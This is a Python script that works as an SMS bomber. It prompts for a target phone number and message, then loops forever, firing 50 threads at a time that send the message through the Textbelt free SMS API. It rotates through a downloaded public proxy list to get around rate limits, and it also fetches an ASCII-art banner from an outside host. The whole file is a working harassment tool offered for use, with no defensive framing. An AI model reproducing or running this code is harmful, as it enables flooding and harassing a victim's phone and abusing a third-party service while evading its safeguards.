import requests
import threading

THREAD_COUNT = 50  # Change this to the desired number of threads

url = 'https://cdn.droplets.cf/ascii.txt'
response = requests.get(url)

if response.status_code == 200:
    art = response.text
    print(art)
else:
    print(f'Error fetching ASCII art: {response.status_code}')

def send_sms(phone, message, proxy):
    url = 'https://textbelt.com/text'
    payload = {'phone': phone, 'message': message, 'key': 'textbelt'}
    proxies = {'http': proxy, 'https': proxy}
    response = requests.post(url, data=payload, proxies=proxies)
    print(response.json())

def get_proxy():
    proxy_url = 'https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt'
    response = requests.get(proxy_url)
    proxy_list = response.text.strip().split('\n')
    return proxy_list

def main():
    proxies = get_proxy()
    i = 0
    phone = input("Enter the phone number to spam: ")
    message = input("Enter the message to spam: ")
    while True:
        for j in range(THREAD_COUNT):
            proxy = proxies[i]
            t = threading.Thread(target=send_sms, args=(phone, message, proxy))
            t.start()
            i = (i + 1) % len(proxies)
            if i == 0:
                proxies = get_proxy()

if __name__ == '__main__':
    main()
